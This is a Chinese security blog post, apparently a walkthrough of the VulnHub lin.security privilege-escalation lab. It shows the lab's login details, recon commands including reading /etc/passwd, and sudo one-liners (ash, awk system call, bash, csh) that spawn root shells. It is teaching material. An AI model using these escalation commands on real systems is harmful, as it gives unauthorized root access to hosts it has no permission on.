@@ -1,0 +1,1393 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Linux提权靶机lin.security">
+<title>Linux提权靶机lin.security</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="Linux提权靶机lin.security">
+<meta property='og:description' content="Linux提权靶机lin.security">
+<meta property='og:url' content='https://lserein.github.io/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-17T22:10:47&#43;08:00'/><meta property='article:modified_time' content='2025-06-17T22:24:08&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/logo.png' />
+<meta name="twitter:title" content="Linux提权靶机lin.security">
+<meta name="twitter:description" content="Linux提权靶机lin.security"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/logo.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1主机基本信息收集">1.主机基本信息收集</a></li>
+    <li><a href="#2sudo类提权">2.Sudo类提权</a>
+      <ol>
+        <li><a href="#21ash提权">2.1.ash提权</a></li>
+        <li><a href="#22awk提权">2.2.awk提权</a></li>
+        <li><a href="#24csh提权">2.4.csh提权</a></li>
+        <li><a href="#25dash提权">2.5.dash提权</a></li>
+        <li><a href="#26ed提权">2.6.ed提权</a></li>
+        <li><a href="#27env提权">2.7.env提权</a></li>
+        <li><a href="#28expect提权">2.8.expect提权</a></li>
+        <li><a href="#29find提权">2.9.find提权</a></li>
+        <li><a href="#210ftp提权">2.10.ftp提权</a></li>
+        <li><a href="#211lessmore提权">2.11.less/more提权</a></li>
+        <li><a href="#212man提权">2.12.man提权</a></li>
+        <li><a href="#213scp提权">2.13.SCP提权</a></li>
+        <li><a href="#214socat提权">2.14.socat提权</a></li>
+        <li><a href="#215ssh权限提升">2.15.ssh权限提升</a></li>
+        <li><a href="#216vi权限提升">2.16.vi权限提升</a></li>
+        <li><a href="#217zsh权限提升">2.17.zsh权限提升</a></li>
+        <li><a href="#218perl提权">2.18.perl提权</a></li>
+        <li><a href="#219tclsh提权">2.19.<font style="color:rgb(79, 79, 79);">tclsh提权</font></a></li>
+        <li><a href="#220git提权">2.20.git提权</a></li>
+        <li><a href="#221script提权">2.21.script提权</a></li>
+      </ol>
+    </li>
+    <li><a href="#3suid提权">3.SUID提权</a>
+      <ol>
+        <li><a href="#31taskset提权">3.1.taskset提权</a></li>
+      </ol>
+    </li>
+    <li><a href="#4计划任务提权">4.计划任务提权</a></li>
+    <li><a href="#5内核提权漏洞">5.内核提权漏洞</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/">
+                <img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/logo_hu_cbbe206af04dd2d9.png"
+                        srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/logo_hu_cbbe206af04dd2d9.png 800w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/logo_hu_8a2dc2a182931e3c.png 1600w"
+                        width="800" 
+                        height="471" 
+                        loading="lazy"
+                        alt="Featured image of post Linux提权靶机lin.security" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                内网安全
+            </a>
+        
+            <a href="/categories/%E9%9D%B6%E5%9C%BA%E6%94%BB%E7%95%A5/" >
+                靶场攻略
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/">Linux提权靶机lin.security</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Linux提权靶机lin.security
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 17, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>靶机下载地址：<a class="link" href="https://download.vulnhub.com/linsecurity/lin.security_v1.0.ova"  target="_blank" rel="noopener"
+    >https://download.vulnhub.com/linsecurity/lin.security_v1.0.ova</a></p>
+<p><a class="link" href="https://blog.csdn.net/weixin_58786230/article/details/140755459"  target="_blank" rel="noopener"
+    >lin.security_v1.0靶机-CSDN博客</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">使用命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bob</span><span class="o">/</span><span class="n">secret</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ssh</span><span class="w"> </span><span class="n">bob</span><span class="nd">@192.168.145.174</span><span class="w">           
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="1主机基本信息收集">1.主机基本信息收集
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">id</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">whoami</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">uname</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w">                 </span><span class="c1">//查看内核版本信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">          </span><span class="c1">//查看主机用户</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">                  </span><span class="c1">//显示允许当前用户使用的命令</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/1.png"
+	width="1482"
+	height="217"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/1_hu_ecf4245097e44a05.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/1_hu_ffd6316ccee9fbc5.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="682"
+		data-flex-basis="1639px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">bob</span><span class="nd">@linsecurity</span><span class="p">:</span><span class="o">~</span><span class="n">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">bob</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">bob</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">linsecurity</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span><span class="w"> </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="w"> </span><span class="n">bob</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">linsecurity</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">(</span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ash</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">awk</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">csh</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">curl</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ed</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">expect</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">find</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ftp</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">less</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">man</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">more</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">scp</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">socat</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ssh</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">vi</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zsh</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">pico</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">rvim</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">perl</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">tclsh</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">git</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">script</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">scp</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/2.png"
+	width="2196"
+	height="281"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/2_hu_2889fc570ef68a57.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/2_hu_e1973df8b3cab0e4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="781"
+		data-flex-basis="1875px"
+	
+></p>
+<p>发现以上命令可以使用sudo权限</p>
+<p><strong>通过该网址进行搜索哪些可以使用sudo进行提权</strong></p>
+<p><a class="link" href="https://gtfobins.github.io/#ash"  target="_blank" rel="noopener"
+    ><strong>https://gtfobins.github.io/#ash</strong></a></p>
+<p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/3.png"
+	width="2019"
+	height="1123"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/3_hu_8dec43d456219ee1.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/3_hu_cb70c7d98397389b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="431px"
+	
+></p>
+<h2 id="2sudo类提权">2.Sudo类提权
+</h2><h3 id="21ash提权">2.1.ash提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">ash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/4.png"
+	width="1117"
+	height="185"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/4_hu_417a086545f27f98.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/4_hu_ea6f8b34a4623476.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="603"
+		data-flex-basis="1449px"
+	
+></p>
+<h3 id="22awk提权">2.2.awk提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="err">&#39;</span><span class="n">BEGIN</span><span class="w"> </span><span class="p">{</span><span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">)}</span><span class="err">&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/5.png"
+	width="948"
+	height="193"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/5_hu_ce834586dcc0c654.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/5_hu_1adc8ad575fd1631.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="491"
+		data-flex-basis="1178px"
+	
+></p>
+<p>2.3.bash提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">bash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/6.png"
+	width="1354"
+	height="198"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/6_hu_8e9ab4bc916394d7.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/6_hu_6f5d58b488041d8f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="683"
+		data-flex-basis="1641px"
+	
+></p>
+<h3 id="24csh提权">2.4.csh提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">csh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/7.png"
+	width="1029"
+	height="235"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/7_hu_3455b1d8d5de84e.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/7_hu_5b5fd43024ff3837.png 1024w"
+	loading="lazy"
+	
+	
